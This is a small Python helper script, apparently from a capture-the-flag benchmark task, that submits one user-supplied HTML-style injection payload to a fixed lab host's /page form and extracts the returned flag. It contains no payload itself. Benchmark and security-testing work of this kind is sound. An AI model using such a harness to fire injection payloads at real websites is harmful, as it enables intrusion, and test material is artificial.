#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import re
import requests
from urllib.parse import quote_plus

"""
X-011-24 单次 payload 测试脚本

用法：
  python3 benchmarks/X-011-24/exp.py "<payload>"

行为：仅向默认目标 POST /page，提交 solution=<urlencode(payload)>，
解析返回中的 flag。如果找不到则打印完整响应文本。
"""

DEFAULT_BASE = "http://ip32861"


def extract_flag(text: str):
    m = re.search(r'Here is the flag:\s*([^<\r\n]+)', text, re.I)
    if m:
        return m.group(1).strip()
    m = re.search(r'FLAG\{[^}]+\}', text)
    if m:
        return m.group(0)
    return None


def main():
    if len(sys.argv) != 2 or not sys.argv[1].startswith('<'):
        print('Usage: python3 benchmarks/X-011-24/exp.py "<payload>"')
        sys.exit(1)

    payload = sys.argv[1]

    headers = {
        'User-Agent': 'Mozilla/5.0 (X-011-24-EXP)',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = 'solution=' + quote_plus(payload)
    try:
        resp = requests.post(f"{DEFAULT_BASE}/page", headers=headers, data=data, timeout=20)
    except Exception as e:
        print(f"[!] Request failed: {e}")
        sys.exit(2)

    flag = extract_flag(resp.text)
    if flag:
        print(flag)
        sys.exit(0)
    print(resp.text)
    sys.exit(2)


if __name__ == "__main__":
    main()
